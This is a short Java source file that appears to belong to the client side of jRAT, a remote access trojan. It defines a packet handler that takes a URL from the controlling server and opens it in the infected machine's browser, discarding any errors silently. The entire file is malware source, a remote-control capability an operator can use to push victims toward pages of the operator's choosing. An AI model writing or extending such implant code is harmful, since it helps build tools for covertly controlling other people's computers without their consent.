package jrat.client.packets.incoming;

import jrat.client.Connection;

import java.net.URI;


public class Packet14VisitURL implements IncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		String url = con.readLine();
		try {
			java.awt.Desktop.getDesktop().browse(new URI(url));
		} catch (Exception ex) {

		}
	}

}
